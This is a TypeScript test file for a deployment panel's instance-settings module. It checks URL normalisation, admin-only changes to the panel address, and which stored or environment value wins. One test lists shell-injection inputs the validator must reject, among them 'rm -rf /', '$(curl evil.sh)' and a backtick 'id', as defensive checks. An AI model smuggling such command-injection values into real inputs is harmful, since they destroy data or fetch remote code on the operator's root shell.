import { test, before, after, beforeEach } from "node:test";
import assert from "node:assert/strict";

import type { PGlite } from "@electric-sql/pglite";

import { makeTestDb, type TestDb } from "../db/test-harness";
import { __setTestDb, __resetTestDb } from "../db/client";
import { runWithIdentity } from "../auth/request-context";
import { seedIdentity, TRUNCATE_IDENTITY, TEAM_A } from "./identity-test-helpers";
import {
  getInstanceSettings,
  instancePublicBaseUrl,
  normalizePanelUrl,
  setPanelUrl,
} from "./instance-settings";

/**
 * The panel address is not an ordinary text setting: it is interpolated into
 * copy-and-run strings, above all a server's install command, which the operator
 * pastes into a ROOT shell. So the two things pinned here are the ones that would
 * hurt if they slipped:
 *
 *  1. Nothing with a shell metacharacter, a path, or credentials in it can ever
 *     be stored, whatever an API client sends.
 *  2. Only an instance admin can move it, because moving it changes where every
 *     future agent calls home to.
 *
 * Plus the resolution order every URL Deplo hands out depends on: what an admin
 * stored wins over the DEPLO_PUBLIC_URL the box was installed with.
 */

let db: TestDb;
let pg: PGlite;

const ADMIN = "admin1";
const MEMBER = "member2";

before(async () => {
  ({ db, pg } = await makeTestDb());
  __setTestDb(db);
});

after(async () => {
  __resetTestDb();
  await pg.close();
});

beforeEach(async () => {
  await pg.exec(TRUNCATE_IDENTITY);
  await seedIdentity(db, {
    users: [
      { id: ADMIN, teamId: TEAM_A, role: "owner", isInstanceAdmin: true },
      { id: MEMBER, teamId: TEAM_A, role: "member", isInstanceAdmin: false },
    ],
  });
});

const asUser = <T>(userId: string, fn: () => Promise<T>): Promise<T> =>
  runWithIdentity({ userId, teamId: TEAM_A }, fn);

test("a bare domain is stored as an https URL", () => {
  assert.equal(normalizePanelUrl("deplo.example.com"), "https://deplo.example.com");
  assert.equal(normalizePanelUrl("  deplo.example.com/  "), "https://deplo.example.com");
  // An explicit http stays http: a bare IP with no proxy in front of it is a
  // real, if temporary, way to run this.
  assert.equal(normalizePanelUrl("http://10.0.0.4:3000"), "http://10.0.0.4:3000");
});

test("anything that could escape a shell, or carry credentials, is refused", () => {
  for (const bad of [
    "deplo.example.com; rm -rf /",
    "deplo.example.com && curl evil.sh",
    "$(curl evil.sh)",
    "deplo.example.com`id`",
    "https://user:pw@deplo.example.com",
    "https://deplo.example.com/some/path",
    "ftp://deplo.example.com",
    "not a host",
  ]) {
    assert.throws(() => normalizePanelUrl(bad), new RegExp("."), `must refuse ${bad}`);
  }
});

test("only an instance admin can move the address", async () => {
  await assert.rejects(
    () => asUser(MEMBER, () => setPanelUrl("deplo.example.com")),
    /admin/i,
  );
  await assert.rejects(() => asUser(MEMBER, () => getInstanceSettings()), /admin/i);
});

test("a stored address wins over the one the box was installed with", async (t) => {
  const previous = process.env.DEPLO_PUBLIC_URL;
  process.env.DEPLO_PUBLIC_URL = "https://installed.example.com";
  t.after(() => {
    if (previous === undefined) delete process.env.DEPLO_PUBLIC_URL;
    else process.env.DEPLO_PUBLIC_URL = previous;
  });

  // Nothing stored: the install-time value is what Deplo hands out.
  assert.equal(await asUser(ADMIN, () => instancePublicBaseUrl()), "https://installed.example.com");

  const saved = await asUser(ADMIN, () => setPanelUrl("moved.example.com"));
  assert.equal(saved.panelUrl, "https://moved.example.com");
  assert.equal(saved.panelUrlSource, "stored");
  assert.equal(await asUser(ADMIN, () => instancePublicBaseUrl()), "https://moved.example.com");

  // Clearing it hands the answer back to the environment rather than leaving an
  // instance with no address at all.
  const cleared = await asUser(ADMIN, () => setPanelUrl(null));
  assert.equal(cleared.storedPanelUrl, null);
  assert.equal(cleared.panelUrl, "https://installed.example.com");
  assert.equal(cleared.panelUrlSource, "environment");
});
